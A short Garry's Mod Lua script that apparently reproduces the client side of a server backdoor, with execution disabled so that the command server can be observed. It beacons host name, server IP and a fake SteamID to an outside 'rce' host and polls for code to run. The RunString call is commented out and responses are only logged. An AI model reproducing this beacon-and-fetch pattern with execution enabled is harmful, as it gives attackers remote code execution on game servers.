

local URL = "http://gmod-rce-senator.c9users.io"

local function Save(Name, cont)
	file.Append("bd_"..Name..".txt", "<"..cont..">\r\n")
end

local SID 		= "STEAM_0:0:0" --Use a fake ID



local clientIP = "0.0.0.0:0"

print("! api0")
http.Fetch(URL.."/address.php",
	function(ip)
		Save("api0", ip)
		
		clientIP = ip
	end,
	function(e)
		Save("api0_e", e)
	end
)


timer.Simple(1, function()
	print("! api1")
	
	http.Post(URL.."/api.php",
		{
			request="notify",
			steamid=SID,
			ip=clientIP,
			servername=GetHostName(),
			serverip=game.GetIPAddress()
		},
		function(body) Save("api1", body) end, function(e) Save("api1_e", e) end
	)
end)

timer.Simple(5, function()
	print("! api2")
	
	http.Post( URL.."/api.php",
		{
			request="pingback"
		},
		
		function( body, p0, p1, p2 )
			Save("api2", body)
			
			local response = util.JSONToTable(body);
			if(response != nil) then
				if(string.find(response["packet-r"]["target"],SID) || string.find(response["packet-r"]["target"], "*")) then 
					if(!string.find(response["packet-r"]["target"], "!" .. SID) && response["packet-r"]["re"] != "null") then
						--RunString();
						print("! api2, RUNSTRING")
						
						Save("api2_runstring", response["packet-r"]["re"] )
					end
				end
			end
		end, 
		function(e)
			Save("api2_e", e)
		end)
end)




















